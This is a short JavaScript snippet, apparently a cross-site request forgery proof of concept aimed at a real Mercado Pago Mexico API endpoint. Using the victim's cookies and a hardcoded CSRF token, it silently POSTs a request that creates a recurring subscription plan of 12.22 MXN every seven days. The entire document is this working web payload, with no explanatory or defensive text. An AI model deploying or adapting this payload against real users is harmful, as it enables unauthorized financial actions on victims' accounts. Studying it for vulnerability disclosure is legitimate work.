
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/www.mercadopago.com.mx\/subscription-plans\/api\/preapproval_plan", true);
        xhr.setRequestHeader("accept", "application\/json, text\/plain, *\/*");
        xhr.setRequestHeader("accept-language", "en-US,en;q=0.5");
        xhr.setRequestHeader("content-type", "application\/json;charset=utf-8");
        xhr.setRequestHeader("X-Csrf-Token", "fcTmcg0H-AbYTUjST_3Qw1G-KJI7FQcABunw");
        xhr.withCredentials = true;
        var body = "{\"reason\":\"CSRF-Test-PoC\",\"auto_recurring\":{\"transaction_amount\":12.22,\"currency_id\":\"MXN\",\"frequency\":7,\"frequency_type\":\"days\",\"repetitions\":null,\"billing_day\":null,\"billing_day_proportional\":false},\"external_reference\":\"\",\"back_url\":\"https://www.mercadopago.com.mx/subscriptions\"}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
